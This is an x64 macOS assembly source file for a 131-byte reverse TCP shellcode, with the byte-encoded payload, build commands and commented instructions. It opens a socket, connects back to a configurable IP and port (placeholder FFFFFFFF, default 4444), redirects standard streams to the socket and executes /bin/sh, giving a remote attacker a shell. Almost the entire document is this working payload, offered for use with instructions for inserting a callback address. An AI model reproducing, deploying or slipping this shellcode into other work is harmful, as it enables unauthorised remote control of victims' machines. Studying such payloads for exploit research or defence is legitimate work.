;osx x64 reverse tcp shellcode (131 bytes)
;Jacob Hammack
;jacob.hammack@hammackj.com
;http://www.hammackj.com
;
;props to http://www.thexploit.com/ for the blog posts on x64 osx asm
;I borrowed some of his code
;

;#OSX reverse tcp shell (131 bytes)
;#replace FFFFFFFF around byte 43 with the call back ip in hex
;#replace 5C11 around byte 39 with a new port current is 4444
;shellcode =
;"\x41\xB0\x02\x49\xC1\xE0\x18\x49\x83\xC8\x61\x4C\x89\xC0\x48" +
;"\x31\xD2\x48\x89\xD6\x48\xFF\xC6\x48\x89\xF7\x48\xFF\xC7\x0F" +
;"\x05\x49\x89\xC4\x49\xBD\x01\x01\x11\x5C\xFF\xFF\xFF\xFF\x41" +
;"\xB1\xFF\x4D\x29\xCD\x41\x55\x49\x89\xE5\x49\xFF\xC0\x4C\x89" +
;"\xC0\x4C\x89\xE7\x4C\x89\xEE\x48\x83\xC2\x10\x0F\x05\x49\x83" +
;"\xE8\x08\x48\x31\xF6\x4C\x89\xC0\x4C\x89\xE7\x0F\x05\x48\x83" +
;"\xFE\x02\x48\xFF\xC6\x76\xEF\x49\x83\xE8\x1F\x4C\x89\xC0\x48" +
;"\x31\xD2\x49\xBD\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x49\xC1\xED" +
;"\x08\x41\x55\x48\x89\xE7\x48\x31\xF6\x0F\x05"

;nasm -f macho reverse_tcp.s -o reverse_tcp.o
;ld -o reverse_tcp -e start reverse_tcp.o

BITS 64

section .text
global start

start:
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x61                 ; socket is 0x61
  mov rax, r8                 ; put socket syscall # into rax

;Socket
  xor rdx, rdx                ; zero out rdx
  mov rsi, rdx                ; AF_NET = 1
  inc rsi                     ; rsi = AF_NET
  mov rdi, rsi                ; SOCK_STREAM = 2
  inc rdi                     ; rdi = SOCK_STREAM
  syscall                     ; call socket(SOCK_STREAM, AF_NET, 0);

  mov r12, rax                ; Save the socket

;Sock_addr
  mov r13, 0xFFFFFFFF5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
  mov r9b, 0xFF               ; The sock_addr_in is + FF from where we need it
  sub r13, r9                 ; So we sub 0xFF from it to get the correct value and avoid a null
  push r13                    ; Push it on the stack
  mov r13, rsp                ; Save the sock_addr_in into r13


;Connect
  inc r8                      ; Connect = 0x62, so we inc by one from the previous syscall
  mov rax, r8                 ; move that into rax
  mov rdi, r12                ; move the saved socket fd into rdi
  mov rsi, r13                ; move the saved sock_addr_in into rsi
  add rdx, 0x10               ; add 0x10 to rdx
  syscall                     ; call connect(rdi, rsi, rdx)

  sub r8, 0x8                 ; subtract 8 from r8 for the next syscall dup2 0x90
  xor rsi, rsi                ; zero out rsi

dup:
  mov rax, r8                 ; move the syscall for dup2 into rax
  mov rdi, r12                ; move the FD for the socket into rdi
  syscall                     ; call dup2(rdi, rsi)

  cmp rsi, 0x2                ; check to see if we are still under 2
  inc rsi                     ; inc rsi
  jbe dup                     ; jmp if less than 2

  sub r8, 0x1F                ; setup the exec syscall at 0x3b
  mov rax, r8                 ; move the syscall into rax

;exec
  xor rdx, rdx                ; zero out rdx
  mov r13, 0x68732f6e69622fFF ; '/bin/sh' in hex
  shr r13, 8                  ; shift right to create the null terminator
  push r13                    ; push to the stack
  mov rdi, rsp                ; move the command from the stack to rdi
  xor rsi, rsi                ; zero out rsi
  syscall                     ; call exec(rdi, 0, 0)